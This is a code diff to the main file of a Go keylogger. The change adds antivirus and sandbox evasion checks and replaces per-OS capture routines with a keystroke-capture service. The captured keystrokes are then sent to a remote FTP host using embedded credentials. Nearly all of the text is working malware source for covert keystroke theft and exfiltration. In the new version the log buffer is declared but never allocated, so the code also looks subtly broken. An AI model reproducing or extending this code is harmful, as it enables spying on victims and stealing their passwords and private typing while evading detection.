@@ -2,14 +2,12 @@ package main
 
 import (
 	"bytes"
-	"log"
 	"runtime"
 	"time"
 
 	"github.com/adelapazborrero/logger/connector"
-	"github.com/adelapazborrero/logger/os-utils/linux"
-	"github.com/adelapazborrero/logger/os-utils/mac"
-	"github.com/adelapazborrero/logger/os-utils/windows"
+	"github.com/adelapazborrero/logger/keys"
+	"github.com/adelapazborrero/logger/utils"
 )
 
 const (
@@ -23,29 +21,23 @@ const (
 )
 
 func main() {
-	now := time.Now()
-	time.Sleep(3 * time.Second)
+	utils.AVBehaviourCheck()
+	utils.SandboxCheck()
 
-	if time.Since(now) < 3*time.Second {
-		log.Fatal("Nothing to do. Exiting...")
-		return
-	}
+	var logBuffer *bytes.Buffer
 
-	logBuffer := new(bytes.Buffer)
+	keyLogger := keys.NewKeyLoggerService(runtime.GOOS)
+	keyLogger.InitLogger()
+	keyLogger.CaptureKeys(logBuffer)
 
-	switch runtime.GOOS {
-	case "linux":
-		go linux.CaptureKeyboardKeysLinux(logBuffer)
-	case "windows":
-		go windows.CaptureKeyboardKeysWindows(logBuffer)
-	case "darwin":
-		go mac.CaptureKeyboardKeysDarwin(logBuffer)
-	default:
-		log.Fatal("Unsupported operating system")
-		return
-	}
-
-	ftp := connector.NewFTP(FTP_HOST, USERNAME, PASSWORD, DEFAULT_TIMEOUT, MAX_JITTER, RECONNECT_DELAY)
+	ftp := connector.NewFTP(
+		FTP_HOST,
+		USERNAME,
+		PASSWORD,
+		DEFAULT_TIMEOUT,
+		MAX_JITTER,
+		RECONNECT_DELAY,
+	)
 
 	ftp.SendData(logBuffer)
 }
